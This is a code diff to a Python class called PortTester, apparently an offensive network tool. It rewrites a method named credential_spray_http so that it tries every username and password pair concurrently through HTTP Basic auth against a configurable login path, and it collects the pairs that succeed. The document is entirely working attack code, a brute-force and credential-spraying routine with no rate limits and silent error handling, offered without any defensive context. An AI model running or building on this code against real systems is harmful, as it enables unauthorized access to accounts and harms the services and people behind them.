@@ -119,15 +119,21 @@ class PortTester:
             await asyncio.gather(*tasks)
         return discovered
 
-    async def credential_spray_http(self, base_url: str, usernames: list, password: str):
+    async def credential_spray_http(self, base_url: str, usernames: list, passwords: list, login_path: str = "/login"):
         successes = []
         async with aiohttp.ClientSession(headers=self.headers, cookies=self.cookies) as session:
-            for username in usernames:
+            async def try_combo(username, password):
                 try:
                     auth = aiohttp.BasicAuth(username, password)
-                    async with session.get(f"{base_url.rstrip('/')}/login", auth=auth, timeout=3) as resp:
+                    target_url = f"{base_url.rstrip('/')}{login_path if login_path.startswith('/') else '/' + login_path}"
+                    async with session.get(target_url, auth=auth, timeout=3) as resp:
                         if resp.status == 200 or ("dashboard" in str(resp.url).lower() and resp.status != 401):
-                            successes.append({"username": username, "password": password})
+                            return {"username": username, "password": password}
                 except Exception:
                     pass
+                return None
+
+            tasks = [try_combo(u, p) for u in usernames for p in passwords]
+            results = await asyncio.gather(*tasks)
+            successes = [res for res in results if res is not None]
         return successes
